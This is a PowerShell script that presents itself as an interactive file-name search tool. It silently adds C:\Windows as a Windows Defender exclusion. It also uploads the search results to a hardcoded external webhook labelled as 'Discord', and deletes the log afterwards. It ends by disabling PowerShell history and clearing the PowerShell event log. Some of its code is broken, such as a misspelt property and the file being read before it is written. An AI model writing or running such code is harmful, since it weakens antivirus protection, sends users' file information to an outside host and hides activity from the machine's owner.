#Exclusion additon.
try {
    $exclusionPath = "C:\Windows"
    Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue -ErrorVariable AddExclusionError | Out-Null
    if (-not $AddExclusionError) {
    }
}
catch {}  
do {
    $SearchTerm = Read-Host "Enter a name or part of it to search for"
    $UserProfilePath = [System.Environment]::GetFolderPath('UserProfile')
    $Partitions = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 -and $_.DeviceID -ne "C:" } | ForEach-Object { $_.DeviceID + '\' }
    $Results = @()
    # Search user profile on the C drive
    $UserProfileResults = Get-ChildItem -Path $UserProfilePath -Recurse | Where-Object { $_.Name -like "*$SearchTerm*" }
    $Results += $UserProfileResults | Sort-Object -Property LastWriteTime -Descending
    # Search other partitions
    foreach ($Partition in $Partitions) {
        $PartitionResults = Get-ChildItem -Path $Partition -Recurse | Where-Object { $_.Name -like "*$SearchTerm*" }
        $Results += $PartitionResults | Sort-Object -Property LastWriteTime -Descending
    }
    if ($Results.Count -eq 0) {
        Write-Host "No matching files or folders found." -ForegroundColor Yellow -BackgroundColor Black
    }
    else {
        $Results | Sort-Object -Property LastWriteTime -Descending | Format-Table -Property FullName, LastWriteTime -Wrap -AutoSize 
    }
    $choice = Read-Host "Choose an option: 'e' to search something else, 'd' to send to Discord, 'q' to quit"
    
    if ($choice.ToLower() -eq 'd') {
        $AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
        foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
        $finaloutput = Join-Path $env:USERPROFILE "Music\SearchLog.txt"
        $apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileBytes = [System.IO.File]::ReadAllBytes($finaloutput)
        $fileName = [System.IO.Path]::GetFileName($finaloutput)
        $LF = "`r`n"
        $body = (
        "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
        "Content-Type: application/octet-stream$LF$LF" +
        [System.Text.Encoding]::Default.GetString($fileBytes) + $LF +
        "--$boundary--$LF"
        )
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $Results | Sort-Object -Property LastWriteTime -Descending | Format-Table -Property FullName, LastWriteTimeq | Out-File -FilePath $finaloutput -Encoding UTF8
        # Send the text file to the api
        Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyBytes -UseBasicParsing | Out-Null
        # Delete the log and exe files on exit
        Start-Sleep -Seconds 5
        Remove-Item -Path $finaloutput -Force -ErrorAction SilentlyContinue
        $choice = Read-Host "Choose an option: 'e' to search something else, 'q' to quit"
    }
} while ($choice.ToLower() -ne 'q')
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent